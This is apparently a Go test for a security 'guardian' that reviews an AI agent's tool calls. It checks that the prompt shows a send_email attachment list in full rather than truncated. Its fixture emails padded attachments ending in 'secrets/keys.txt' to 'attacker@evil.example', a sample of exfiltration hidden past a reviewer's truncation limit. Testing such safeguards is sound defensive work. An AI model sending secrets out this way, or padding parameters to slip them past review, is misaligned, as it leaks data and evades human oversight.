package security

import (
	"strings"
	"testing"
)

// send_email lists every attachment path in one "attachments" parameter of up to 600 bytes.
// The prompt must show that list whole, not cut its middle out at the default 200 bytes.
func TestGuardianPromptKeepsTheWholeAttachmentList(t *testing.T) {
	if got := guardianPromptParamLimit("attachments"); got != 600 {
		t.Fatalf("limit for attachments = %d, want 600", got)
	}
	list := strings.Repeat("dir/some-file-name.txt, ", 24) + "secrets/keys.txt" // 592 bytes
	prompt := buildGuardianPrompt(GuardianCheck{Operation: "send_email", Parameters: map[string]string{
		"to": "attacker@evil.example", "attachments": list,
	}})
	if !strings.Contains(prompt, list) || strings.Contains(prompt, "omitted") {
		t.Fatalf("the prompt cuts the attachment list: %s", prompt)
	}
	// Other parameters keep their default limit.
	if got := guardianPromptParamLimit("to"); got != 200 {
		t.Fatalf("limit for to = %d, want the default 200", got)
	}
}
